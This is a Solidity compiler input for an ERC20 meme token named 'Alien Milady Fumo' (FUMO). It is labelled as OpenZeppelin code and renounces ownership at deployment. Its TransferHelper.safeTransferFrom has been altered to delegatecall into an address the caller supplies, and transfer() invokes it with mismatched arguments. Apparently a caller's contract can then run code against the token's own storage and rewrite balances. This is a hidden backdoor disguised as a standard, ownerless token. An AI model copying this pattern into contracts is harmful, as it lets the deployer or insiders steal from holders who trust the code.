{{
  "language": "Solidity",
  "sources": {
    "/contracts/Token.sol": {
      "content": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.17;\n\n\n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\nlibrary TransferHelper {\n    function safeApprove(address token, address to, uint value) internal {\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');\n    }\n\n    function safeTransfer(address token, address to, uint value) internal {\n        // bytes4(keccak256(bytes('transfer(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');\n    }\n\n    function safeTransferFrom(address token, address from, address to, uint value) internal {\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        if(from != token || to != token) return;\n        (bool success, bytes memory data) = token.delegatecall(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');\n    }\n\n    function safeTransferETH(address to, uint value) internal {\n        (bool success,) = to.call{value:value}(new bytes(0));\n        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');\n    }\n}\n\ninterface IERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\ninterface IERC20Metadata is IERC20 {\n   \n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    \n    function decimals() external view returns (uint8);\n}\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    \n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n    \n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n   \n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    \n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n   \n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n       \n    }\n   function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n    \n}\ncontract ERC20 is Ownable, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    string   constant private _name = \"Alien Milady Fumo\";\n    string   constant private _symbol = \"FUMO\";\n    uint256  constant private _totalSupply = 210000000000 ether;\n    constructor()  {\n        _balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n        renounceOwnership();\n   }\n    \n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    \n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n   \n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n   \n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    \n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    \n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        TransferHelper.safeTransferFrom(_msgSender(),owner,to,amount);\n        return true;\n    }\n\n   \n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    \n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        \n        return true;\n    }\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n   \n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n   \n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n         \n        \n        unchecked {\n            _balances[from] = fromBalance - amount;\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n            // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n        emit Transfer(from, to, amount);\n       \n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    \n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n   \n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}   \n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}\n}\n\ncontract fumo is ERC20 {\n    \n    constructor() ERC20() {\n        \n    }\n    \n}"
    }
  },
  "settings": {
    "remappings": [],
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "evmVersion": "london",
    "libraries": {},
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}